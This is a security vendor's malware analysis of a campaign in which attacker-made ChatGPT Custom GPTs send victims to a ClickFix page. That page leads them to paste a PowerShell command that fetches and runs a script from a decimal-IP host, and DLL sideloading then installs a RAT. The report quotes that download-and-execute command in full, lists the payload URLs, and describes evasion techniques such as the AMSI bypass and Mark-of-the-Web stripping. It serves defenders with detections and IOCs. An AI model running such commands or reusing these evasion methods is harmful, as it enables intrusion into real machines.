---
title: Attackers Abuse ChatGPT Custom GPTs to Deliver RAT via ClickFix | Huntress
author: Mark O'Halloran; Jonathan Semon
url: https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
hostname: huntress.com
description: Huntress researchers reveal how attackers are exploiting ChatGPT Custom GPTs to spread ClickFix lures and DLL-sideloaded malware. See the full breakdown.
sitename: Huntress
date: "2026-09-28"
---
*Acknowledgements**: Special thanks to Tanner Filip, Camilo Lima, Ethan Williams, Ryan Eisenhower, Jose Oregon, Jai Minton, Susannah Matt, and Lindsey Welch for their contributions to this investigation and writeup.*

## Background

The popularity of AI models like Claude, ChatGPT, and Grok in 2026 is no secret, and over the past few months Huntress researchers have seen threat actors taking advantage of these trusted platforms. We've observed attackers abusing Claude Artifacts, shared ChatGPT conversations, and more in order to convince victims to click on malicious links or run Terminal commands.

Starting late September, Huntress researchers observed a new campaign that used another, legitimate ChatGPT feature: Custom GPT. Custom GPTs let users build a personalized version of ChatGPT for a specific purpose, enabling them to include related instructions, knowledge files, and tools. These live on the legitimate [__ChatGPT.com__](https://ChatGPT.com) website and populate the webpage with the Custom GPT name at the top, followed by the builder's profile underneath. 

In the incidents we saw, victims interacted with an attacker-created Custom GPT, which was programmed to respond to their prompts with a message that included a Google Sites link. This link then brought them to a [__ClickFix-style attack__](https://www.huntress.com/blog/friendly-prompt-is-clickfix-scam), which led to the download and execution of a malicious MSI installer. This installer then deployed a legitimate, Canon-signed application (`COTFileReadApp.exe`), which attackers abused to sideload a malicious DLL and evade detection. 

The campaign has impacted dozens of users: the [__Huntress SOC__](https://www.huntress.com/why-huntress/24-7-soc) has responded to at least 40 incidents stemming from the specific Google Sites domain involved in this attack, and confirmed that two of these incidents came through a Custom GPT instance. Huntress reached out to OpenAI regarding this specific Custom GPT, and it was taken down as of September 25; however, on September 27 Huntress researchers discovered a new Custom GPT linked to the same campaign. Threat actors are finding success in this specific abuse of Custom GPTs for social engineering and are continuing to rely on this technique.

*VIDEO: Mark O'Halloran walks through the initial clicks that kick off the attack chain*

## The Custom GPT lure

In some of the incidents that we investigated, the attack started when victims searched on Google for "chatgpt." A sponsored result then led them to the Custom GPT page on the legitimate ChatGPT domain. The URL they landed on carries Google Ads click-tracking parameters (`gad_source`, `gad_campaignid` and a click ID we've left out), which Google appends when someone clicks one of its paid ads. As we've seen with other AI platform abuse attacks, paying for the ad puts the link above the organic results, making it more likely that targets would visit it: `hxxps://chatgpt[.]com/g/g-6ab595ad6554819181b686d4876efb80-plus-5-6?gad_source=1&gad_campaignid=[REDACTED]`

Note that this was the initial domain for the Custom GPT that Huntress researchers found and reported to OpenAI; as of publication this Custom GPT was taken down, but the SOC has seen a new Custom GPT linked to this campaign that is still active as of publication. This domain is at: `hxxps://chatgpt[.]com/g/g-6ab6ba039440819185ed491740b11cf8-plus-5-6`

Attackers titled this Custom GPT "Plus 5.6" so that an unsuspecting visitor would mistake it for an actual ChatGPT model. As seen in Figure 1, underneath the title the page indicates that it's by a "community builder." This is a tip off for someone who understands what a Custom GPT is, but for an unknowing user this page could pass as a normal, everyday ChatGPT conversation with a new model.

*Figure 1: Threat actors abused ChatGPT's Custom GPT feature to deliver this lure*  

This Custom GPT has been programmed to serve one message for targets that interact with it: as seen in Figure 2, it delivers them a "Service Availability Notice" and tells them it's "experiencing limited availability on the primary domain." In order to continue, users must upgrade their subscription to Plus or "continue using the service through our backup domain."

*Figure 2: Any interaction with this Custom GPT results in the message above*

That "backup domain" is `hxxps[://]sites[.]google[.]com/view/antibot172881`, hosted on a Google Sites page. This Google Sites page presents as a CloudFlare CAPTCHA check and delivers a ClickFix attack, telling users to copy-and-paste a command into their Terminal.  

*Figure 3: ChatGPT and Cloudflare-branded ClickFix lure on Google Sites page*

This ClickFix attack kickstarts the rest of the attack and leads to the execution of the following PowerShell command:

`\"C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" -ExecutionPolicy Bypass \"irm 1614733393/12 | Out-File $env:temp\\1777.ps1;& $env:temp\\1777.ps1\"`
## The next phase of the attack

The PowerShell command downloads and runs an obfuscated script, which silently installs a malicious MSI (`ISOSimple.msi`). The MSI abuses a legitimate, Canon-signed application to sideload malicious code, then sets up two persistence mechanisms, a User Run key and a scheduled task, both named `Canon Configuration Reader`.

In at least one incident, Microsoft Defender quarantined `ISOSimple.msi` (identifying it as `Trojan:Script/Wacatac.H!ml`). By then, the installer had already run, and the Run key and the scheduled task continued the attack chain anyway.

*Figure 4: In one incident, Microsoft Defender quarantined* *ISOSimple.msi*   

## Technical analysis: from ClickFix to RAT

Most ClickFix chains we see are two or three hops: paste a command, download something, run it. This one has eight, and each hop exists to hide the next one. By the end, a patched Canon DLL has loaded a helper that pulls a loader out of a `.wav` file, and that loader unpacks a [__remote access trojan__](https://www.huntress.com/blog/rats-remote-management-software-from-the-hackers-perspective) (RAT) from an encrypted file system of its own. 

Here is the full chain:

*Figure 5: The infection chain, from the ClickFix command to the RAT*

Read on for more detail on each section and stage of the infection. Everything below comes from analysis of samples recovered from affected hosts. Every stage was decoded by reading the code and reimplementing its decryption.

### Stage 1: Numbers all the way down

The ClickFix commands follow one template across incidents, but the details change per victim. Every version pulls a script with `irm`, writes it to `%TEMP%` under a random number (`1777.ps1` in one incident, `6469.ps1` in another), and runs it. The server changes between incidents too, and we expect there are more out there than the ones we've seen. In the samples analyzed here, the host is written as a decimal number, `1614733393`, rather than a dotted IP. Windows accepts that form and resolves it to `96.62.224[.]81`, but rules and URL filters that look for a dotted IP address never see one.

The script that lands in `%TEMP%` is a single line, 27,581 characters long, and almost all of it is one array of 3,036 negative integers. Each integer is one character of the real script, shifted by a fixed key. The script adds `1520498` to every value, turns the results back into characters, and runs the rebuilt code with `[scriptblock]::Create`, so the decoded version never touches the disk.

*Figure 6: Layer 1, the script as it lands on disk (the middle 2,991 integers are cut)*

Removing the first layer doesn't give you readable code yet. Every string an analyst or scanner would look for, such as the download URL, `Net.WebClient` and `DownloadFile`, is encoded again on its own, this time with a second key, 6178128. Each string gets its own small integer array and decoding loop, so almost nothing but PowerShell syntax is left in plain text:

*Figure 7: Layer 2, the line that builds the download URL*

With both layers removed, the script is short. It forces TLS 1.2 (boilerplate for HTTPS downloads that does nothing here, since the MSI comes over plain HTTP), downloads the MSI from the same decimal-IP host, installs it silently with `msiexec /qn /norestart` in a hidden window, and then deletes itself. The MSI is saved under a fresh GUID every time, so it never has the same name twice. On disk it looks like `%TEMP%\<32 hex characters>_ISOSimple.msi`:

*Figure 8: Layer 3, the fully decoded script*

### Stage 2: Some assembly required

`ISOSimple.msi` introduces itself as "Advanced Printer Configuration Reader" from a publisher called "Softplicity," and installs silently to `%LOCALAPPDATA%\Programs\Advanced Printer Configuration Reader\`.

Two settings make it quieter than a normal installer. `ARPSYSTEMCOMPONENT=1` hides it from Programs and Features, so a user who goes looking for whatever they just installed won't find it. A custom action launches `COTFileReadApp.exe` the moment installation finishes, so nothing waits on a reboot or logon. 

The package holds 177 files, and almost all of them are harmless. Most are a complete, legitimately signed .NET 5 runtime, which the Canon app needs to run. The rest is set dressing: a DOS 6.22 floppy image, a help file, a UI skin to make it look "nice," an MIT license, and an ASProtect library. Of the files, only eight do anything interesting to our investigation:

| **File** | **Description** | 
|---|---|
| `COTFileReadApp.exe` | Legitimate, Canon-signed, from Canon CaptureOnTouch. Used as the host process. | 
| `COTFileReadApp.dll` | Legitimate Canon code that loads `ceiinfolog.dll` | 
| `ceiinfolog.dll` | A real Canon DLL, modified and patched to load `rdCore.dll` . Signature stripped. | 
| `rdCore.dll` | Malicious, unsigned. Extracts and runs the loader from the `.wav` . | 
| `WPFLocalizeExtension.dll` | Malicious, unsigned. Borrows the name of a real open-source .NET library | 
| `WMPCL.dll` | Malicious, unsigned. Loaded by `rdCore` before the payload runs | 
| `Common.Integrator.Preview.wav` | Audio file carrying the encrypted loader | 
| `monitor.raw` | Encrypted archive holding the persistence script and the RAT | 

The first two are genuine Canon code, and that's the point. Once the MSI launches the Canon app, the app behaves exactly as Canon wrote it, and loads its logging library from its own folder. The attackers only had to change what that library brings with it to launch the next stage.

### Stage 3: Canon fodder

`COTFileReadApp.exe` is a real Canon binary from CaptureOnTouch, and its signature checks out. Its companion, `COTFileReadApp.dll`, calls into Canon's logging library, `ceiinfolog.dll`. When a program asks for a DLL by name, Windows checks the program's own folder first, so whatever sits next to the EXE with the right name gets loaded. That's DLL sideloading, and it's the door the attackers used.

The `ceiinfolog.dll` in this package looks like the real thing because it mostly is. Its debug path points into Canon's own build tree (`c:\data\home\ceidriver\...\ceiinfolog.pdb`), its compile timestamp is from 2015, and it still exports the logging functions Canon's code calls. But its signature is gone, the checksum in its header no longer matches its contents, and its import table has one entry a logging library has no business with: `rdCore.dll!instance_levels_`. The import table is the list of other DLLs a library needs, and Windows loads every entry on it before the library's own code runs. So the moment the Canon app loads its logger, `rdCore.dll` comes along for the ride, and nothing in Canon's code has to change.

*Figure 9:* *COTFileReadApp.exe* *signature details next to the unsigned* *ceiinfolog.dll*

The other malicious DLLs were built from scratch, all with the same compile time, 2026-09-24 22:46 UTC, one day before we first saw the samples. They borrow names too, so a quick look at the file properties shows a familiar open-source library instead of an unknown DLL. `rdCore.dll`'s version information claims it's Polly 7.2.3, a popular .NET resilience library, even though it's a native C++/CLI DLL. `WPFLocalizeExtension.dll` takes the name of a real, managed WPF localization library, but this one is native code exporting functions like `split_parameters`, `Language` and `Mail`. 

### Stage 4: Making wav(e)s

`Common.Integrator.Preview.wav` holds up to a quick look. It has a valid RIFF/WAVE header (16-bit stereo PCM at 22,050 Hz), the `file` command calls it audio, and the first part of the file is real audio data. But when you look closer, it falls apart. The header says the file is about 700 KB when it's really just over 1 MB, and part way through, the smooth audio samples turn into random noise (pun slightly intended). 

*Figure 10: The .wav header claims 701,700 bytes, and at offset 0x24362 the audio samples give way to ciphertext*

That noise is the loader. As soon as `rdCore.dll` loads, it starts a thread that:

1. Finds its own folder and loads the file `WMPCL.dll`
2. Opens `Common.Integrator.Preview.wav` , seeks to offset`0x24362` , and reads 341,395 bytes of data
3. Decodes those bytes with a rolling single-byte XOR
4. Copies the results into memory and runs it, using two helper exports from `WPFLocalizeExtension.dll` that appear to allocate the buffer and make it executable

*Figure 11:* *rdCore.dll* *seeks to 0x24362, reads 0x53593 bytes, and XOR-decodes them in place*

The decoder is only a few lines. Reimplemented in Python:

```
r8, r9 = 4, 0x13
for i in range(len(buf)):
   r9 = (r9 + i + 0x23) & 0xFFFFFFFF
   r8 = (r8 * 2 + 9) & 0xFFFFFFFF
   r9 = (r9 + i * 2) & 0xFFFFFFFF
   buf[i] ^= (r8 + 0x23 + r9) & 0xFF
```
Two counters get stirred on every byte, so each byte of the payload is XORed with a different value, and no key sits anywhere in the file for a scanner to find. The algorithm is the key. Run it over the 341,395 bytes, and the noise turns into x64 machine code, starting with a standard function prologue (`sub rsp, 0x28`) and a call into its main routine.

Our first instinct was to call this steganography. But strictly speaking, it isn't. Real audio steganography hides data in the low bits of each sample, so the file still sounds normal. Here the attackers overwrote a stretch of a real recording with ciphertext. It's crude, but it gets past anything that inherently trusts file headers, which covers most automated tooling.

It's also not new: a 2025 Lumma Stealer campaign stuffed its payloads into `.wav`, `.mp3`, `.png` and `.mp4` files behind a PureCrypter layer, and WAV-hidden payloads are an [__Octowave Loader__](https://malpedia.caad.fkie.fraunhofer.de/details/win.octowave) trademark.

### Stage 5: No strings attached

The decoded bytes are 341 KB of position independent x64 shellcode, basically raw machine code that runs from wherever it lands in memory, with no EXE wrapper around it. There isn't a single readable string in it. Every string is assembled on the stack at runtime and decrypted with a small pseudo-random number generator (a linear congruential generator, for the curious), so `strings` and signature scanners come up empty. After a few hours in the disassembler, we wrote a decryptor that finds each stack string and replays the math. The recovered data pointed to:

- An AMSI bypass aimed at `amsi.dll` . AMSI is the Windows interface that lets antivirus inspect scripts and .NET code in memory, so blinding it hides whatever runs next
- Hosting the .NET runtime (CLR v4.0.30319), which lets it run .NET code straight from memory without dropping an assembly to disk
- `ntdll` unhooking, which maps a fresh copy of`ntdll.dll` to get around the hooks EDR products place in the loaded one for monitoring
- Anti-VM checks against CPU vendor strings and a long list of VMware, VirtualBox, Hyper-V, QEMU, Xen and Parallels drivers and services, so it can behave differently inside a sandbox
- A fake "LOADING..." window, most likely there to make the victim think an app is starting up

The loader's main job is to find its storage. It searches its own folder for a file ending in `.bak`, `.db`, `.bin`, `.dat`, `.raw` or `.pak` and checks it against a hardcoded key. If nothing matches, it shows the error `[-] Not Found Storage !` and gives up. In this package, the storage file is `monitor.raw`.

*Figure 12: Decrypted strings from the loader shellcode*

### Stage 6: A raw deal

We'll admit it: `monitor.raw` is our favorite part of the chain. Somebody sat down and built an entire encrypted file system just to smuggle a script and a RAT past the victim's defenses. Instead of one encrypted blob, it's a custom archive with its own folder tree, basically a homemade, encrypted zip file. It starts with a small header, followed by an index of 1,128 entries (one per file or folder, each recording its parent, its size and a per-file key), and then the file contents, packed back to back.

*Figure 13: The decoded folder tree inside* *monitor.raw*

None of `monitor.raw` is readable without the loader's key. Every field in the index is scrambled with arithmetic based on a master key (`0x26ace8d1`) plus a salt (an extra number unique to each entry that gets mixed into the math), so no two entries look alike, and each file is XOR-encrypted with its own one-byte key on top of that. Once we had the key (and understood the math), the parse checked out neatly: the sizes in the decoded index added up to the exact length of `monitor.raw`, down to the exact byte.

Once decrypted, the archive holds 315 folders and 806 files. Most of the files are only a few bytes long: flags, delays and names that together form a compiled settings tree. One of them, though, is a plain-text script written in the malware's own scripting language:

*Figure 14: The task script stored in* *monitor.raw*

You don't need documentation for the language to follow the code. A shutdown monitor writes the HKCU Run key one more time as Windows shuts down. Every 150 seconds, the script checks for that Run key and re-creates it if it's gone, and every 875 seconds it does the same for a scheduled task. The `block_execution` task pulls out the resource named `@input`, runs it from memory, and then sleeps forever to keep the process alive.

Both the Run value and the scheduled task are named `Canon Configuration Reader`, and both launch `COTFileReadApp.exe`. That makes the order of cleanup matter. Delete one while the implant is running and the script puts it back within a few minutes. Kill the process first, then remove both.

`@input` is the final payload: 1.58 MB of shellcode, built with the same toolchain as the loader.

The scripting layer says a lot about the people behind this. To change the persistence names, the timing or the final payload, the operators just ship a new `monitor.raw`, and nothing gets recompiled. That points to a maintained framework rather than a one-off build.

### Stage 7: Smelling like a RAT

As mentioned earlier, `@input` is the final payload. It uses the same string encryption as the loader, and decrypting it turns up about 1,500 strings. Together they describe the full-featured RAT in this campaign.

For hands-on control, it runs remote desktop sessions and screen "broadcasts," and it can capture the endpoint's camera input, the microphone and system audio. It knows of 17 browsers, from Chrome and Edge to Yandex and Arc, can work out which one is the default, and can launch it. A built-in file manager comes with an "advanced search" engine that searches file contents across the whole host.

It's also built to bring friends! The RAT can drop and run follow-on payloads, processing and executing EXE, DLL (through `rundll32` or `regsvr32`), MSI, PowerShell, Batch, VBScript, JScript or ZIP files, either embedded or downloaded from a URL silently in the background.

*Figure 15: RAT strings behind the control, payload and persistence features*

Before any of that though, it takes stock of the host it has infected, documenting:

- Installed antivirus (through WMI calls)
- Microsoft Defender status
- Domain and domain controller details
- Network adapters
- Open ports
- Installed software
- Activated Windows features
- A very detailed hardware fingerprint that doubles as an anti-VM check

To find its C2 server, which the strings call the "Gate," the RAT uses DNS-over-HTTPS through Cloudflare, Google, and Quad9 servers. Its lookups travel inside ordinary HTTPS traffic to well-known resolvers, so they never appear in local DNS logs. The C2 address itself wasn't present in any file we recovered from the attack. Our best guess is that it sits in an encrypted settings file, arrives at runtime, or hides somewhere deeper in the code.

*Figure 16: RAT strings behind the recon, DNS-over-HTTPS C2 and cleanup features*

On the hosts we investigated, the RAT's next move was almost always the same. It dropped a legitimately signed `GOMCam2024.exe` (GOM & Company) into `%LOCALAPPDATA%\AppstorageFile\`, which then launched `chrome.exe` with a throwaway browser profile under `%TEMP%`, lining up with the payload-deploy and browser-launch features above. GOMCam wasn't the only follow-on, though. In a smaller number of incidents, we saw other activity that matches the capabilities described in this section.

## Version two: new paint, same engine

Everything above is the first version we pulled apart, the one built around the Canon app. Not long after the first Custom GPT was taken offline, we were alerted to the other one at `hxxps://chatgpt[.]com/g/g-6ab6ba039440819185ed491740b11cf8-plus-5-6`

After a quick investigation, we confirmed a fresh one took its place and the chain came back wearing a different outfit. We took the new samples apart the same way, and under the paint it is the same kit. Here is how the two versions line up, piece by piece:

*Figure 17: The Canon chain (V1) next to the Stardock chain (V2)*

The bottom row gives it away: the RAT in version two is the exact same file as version one, down to the last byte. The persistence script, the loader shellcode, and the encrypted storage format all carry over untouched, with only the storage key and the per-file cipher having been swapped out.

Everything that changed is wrapping paper. The signed host is now Stardock's `DeElevate64.exe`, the patched Canon logging DLL is replaced by Stardock's own `DeElevator64.dll`, patched the same way with one extra import, and the loader no longer hides in a WAV. This time it is stitched into a real Microsoft NuGet package, `Build.dat`. It's wedged into the middle of the compressed data for one of the package's own DLLs, and since the compressed data already looks random, there's no jump from real audio to noise to give it away.

*Figure 18:* *Build.dat* *in a standard zip tool: a genuine-looking Microsoft package with one warning line*

The delivery also grew sturdier. Where version one's script fetched the MSI directly, version two splits it in two: a tiny stager pulls a second script into memory with a spoofed Chrome user agent, and that second script is freshly obfuscated on every request, so its hash is worthless as an indicator. The download retries up to three times, strips the Mark-of-the-Web from the MSI before running it, and installs silently. Mark-of-the-Web is a hidden tag Windows attaches to anything downloaded from the internet. It's what makes SmartScreen and "this file came from the internet" warnings appear, so stripping it lets the MSI run as if it had been sitting on the disk all along. The loader picked up a sandbox check too. If a helper call fails or the carrier file is missing, it opens a harmless window instead of running the payload.

## Detection opportunities

Most of this chain runs in memory or hides inside files that look harmless, so process activity is the most reliable place to catch it:

- `powershell.exe` launching`msiexec.exe /i %TEMP%\<32 hex characters>_ISOSimple.msi /qn /norestart` (`_IconEdit2Turb.msi` in V2)
- `COTFileReadApp.exe` or`DeElevate64.exe` running from`%LOCALAPPDATA%\Programs\` instead of a real Canon or Stardock install, especially when`msiexec.exe` starts it
- An HKCU Run value or scheduled task named `Canon Configuration Reader` or`Stardock DeElevation Tool`
- An unsigned `ceiinfolog.dll` , or any of`rdCore.dll` ,`WPFLocalizeExtension.dll` and`WMPCL.dll` , in the same folder as`COTFileReadApp.exe`
- In V2: a `DeElevator64.dll` whose header checksum no longer matches, or any of`I++u.dll` ,`senddmp.resources.dll` ,`res.dll` and`Build.dat` , in the same folder as`DeElevate64.exe`

*Figure 19: Delivery timeline for other waves seen across Huntress telemetry*

Unfortunately, we (and you) should expect more costumes. While performing deeper research into the delivery server, we found that it also hosted a third installer, `UltraFreeISOCreateWizardSolution.msi`, the same day the Canon wave started, and it's highly likely other signed applications are being abused the same way. Detections tied to Canon or Stardock names will miss the next swap. The behaviors (so far) carry over: 

- PowerShell launching `msiexec` on a GUID-named MSI in`%TEMP%` ,
- A signed app started by msiexec from a fake product folder under `%LOCALAPPDATA%\Programs\` 
- A Run value and scheduled task that share one name and come back when deleted

Overall, threat actors continue to turn trusted platforms into convincing entry points for social engineering, whether via ChatGPT's Custom GPT feature or through Google Sites for hosting a ClickFix attack. This campaign tricked dozens of victims to run PowerShell and install a malicious payload.

We've [__previously seen attackers__](https://www.huntress.com/blog/ai-attack-surface) abuse legitimate features on AI platforms, including:

- [__SEO-poisoned ChatGPT and Grok conversations__](https://www.huntress.com/blog/amos-stealer-chatgpt-grok-ai-trust) posed as macOS troubleshooting advice and tricked users into running commands that downloaded the AMOS stealer
- A [__sponsored Google result__](https://www.huntress.com/blog/macsync-stealer-rat-reverse-engineering) led Mac users to a shared Claude conversation that instructed them to run a malicious Terminal command, deploying the MacSync stealer.
- A [__malicious Claude Artifact__](https://www.huntress.com/blog/fakeagent-claude-desktop-malvertising-ends-in-dotnet-rat) impersonated a Claude Desktop download page and redirected victims to SectopRAT malware

These campaigns often stay live for just hours or days before the provider takes the content down, but even in that short span, they can draw considerable attention.

## Indicators of Compromise (IOCs)

| **Item** | **Description** | 
|---|---|
| `hxxps://chatgpt[.]com/g/g-6ab595ad6554819181b686d4876efb80-plus-5-6` `hxxps://chatgpt[.]com/g/g-6ab6ba039440819185ed491740b11cf8-plus-5-6` | Attacker-created Custom GPTs titled "Plus 5.6," used as the initial lure. The observed URL included advertising/tracking parameters (omitted here because they are not stable identifiers) | 
| `hxxps://sites[.]google[.]com/view/antibot172881` | Google Sites-hosted ChatGPT-themed ClickFix lure. | 
| `hxxp://1614733393/app/afafa98279c9/ISOSimple[.]msi` | MSI download URL (decimal IP for `96.62.224[.]81` ) | 
| `45.140.205[.]28` | Payload server observed in a related incident (delivery infrastructure varied between incidents). | 
| `96.62.224[.]81` | Hosts the ClickFix script and the MSI | 
| `6469.ps1` **SHA256:**`14e3376befd4b7b52de0757b6264da294ac6b0f9e4ff51cb9bc5b19b243fe335)` | Obfuscated ClickFix stager (filename varies per victim) | 
| `5689.ps1` **SHA256:**`c4603646701069ebdeabc96f74e1f947355ace8575560986d8393fcc6b88d0b7` | V2 ClickFix stager (filename varies per victim) | 
| `Canon Configuration Reader` | Name of both the HKCU Run value and the scheduled task | 
| `ISOSimple.msi` **SHA256:**`6761aad48a3f987238994d92bca97e4b8550e0150607bd67b47b1b6366a371fc` | "Advanced Printer Configuration Reader" installer | 
| `ceiinfolog.dll` **SHA256:**`e58831766e8d4313db9f8b85f90c3a840aa0d84cfeac285beefa40e39ad0d1fb` | Patched Canon DLL (signature stripped, imports `rdCore.dll` ) | 
| `rdCore.dll` **SHA256:** `b77575413c0f97eaf31e4a44c884c1ecdc0049ec89916ceb0bf3aaaedc0442fe` | Decodes and runs the loader hidden in the .wav (fake Polly version info) | 
| `WPFLocalizeExtension.dll` **SHA256:**`eff5d63ddf1813962f0d8ad1250cea5486c8bb5dd27c3f432b43957a33e43764` | Malicious native DLL borrowing the name of an open-source .NET library | 
| `WMPCL.dll` **SHA256:** `9c615db040b88c18ce6b96f30d08797045b7d506f940bea452dc7a6992fdbb8d` | Malicious helper DLL loaded by `rdCore.dll` | 
| `Common.Integrator.Preview.wav` **SHA256:**`54c94f85ba6e950903d5ff42c0971c5a9d0741596be26e06afe7d60ec38edf31` | Audio file carrying the encrypted loader | 
| `monitor.raw` **SHA256** :`e614b7d5a7a363fb1b355a87e2e8d9e8a05bbbca08f2cee3d606bdb5015ac53b` | Encrypted archive holding the persistence script and the RAT | 
| `Loader shellcode` **SHA256** :`20c7befc174a61117770535e809046c75e93c71284bf1a9c6cd532f55b315f53` | Decoded from the .wav; exists in memory only | 
| `RAT shellcode` **SHA256:**`ab65bbfc505dbe1cebe6021fb36e2011f6aa1d64f5d87cee1cbee3fc2a0c7907` | Decoded from monitor.raw; exists in memory only | 
| `COTFileReadApp.exe` **SHA256** :`278e2f3e2f26c18666b89ef774b4af9ce954e36b2bf54a2392608619245d8c48` | Legitimate Canon-signed binary abused as the host (do not block globally) | 
| `%LOCALAPPDATA%\Programs\Advanced Printer Configuration Reader\` | Install folder | 
| `IconEdit2Turb.msi` **SHA256:**`91a22cf3154944897cbcaffc7d20d4596e972d280ee134197d41d8d8eefb0fe2` | V2 "Stardock Smart DeElevation Tool" installer | 
| `DeElevate64.exe` **SHA256** :`22869e3326fe1de011cd500e666769027126c5c440b76837baf55139f30094e4` | Legitimate Stardock-signed host abused in V2 (do not block globally) | 
| `DeElevator64.dll` **SHA256:**`0457414c4504b70115798eee9c8384a8bf9e793461ffb2e0661a6dcc6ed4809f` | Patched Stardock DLL, imports `I++u.dll` (V2) | 
| `I++u.dll` **SHA256:** `3cd1484cc5bf10e22d79784beba58a75d7b126c46efb5e1a85d6aab884447621` | V2 loader DLL (fake SharpCompress version info) | 
| `senddmp.resources.dll` **SHA256:**`b59a21a8d4c0c11a9ecbbdbe2a2938499c99c5ebb210c9c6db9683c7ad19f4c4` | V2 alloc/exec helper DLL | 
| `res.dll` **SHA256:**`a27cafb84876a3374ef4aba1062345def6cd0b029eaf8e0dc44fa24fc943f3c6` | V2 network helper DLL | 
| `Build.dat` **SHA256:**`d3fda1e6cf886fd530bf62e2d16c39ad23ed12a2c933fc211f1f4876ceaa033e` | NuGet package carrying the encrypted loader (V2) | 
| `execute_engine_disconnect.raw` **SHA256:**`d5acf44658f0dce90bd160f15d8e07a96938c81661d87dc7e9cb0107863bfb90` | V2 encrypted archive (persistence script + RAT) | 
| `hxxp[://]1614733393/s/50d6565cf39e` | V2 stage-2 script URL (decimal IP for `96.62.224[.]81` ) | 
| `hxxp://1614733393/app/50d6565cf39e/IconEdit2Turb[.]msi` | V2 MSI download URL | 
| `%LOCALAPPDATA%\Programs\Stardock Smart DeElevation Tool\` | V2 install folder | 
| `Stardock DeElevation Tool` | V2 name of both the HKCU Run value and the scheduled task | 
| `hxxp://1614733393/app/a26b67343315/UltraFreeISOCreateWizardSolution[.]msi` | Third MSI on the same server, seen 2026-09-23 (not obtained) |
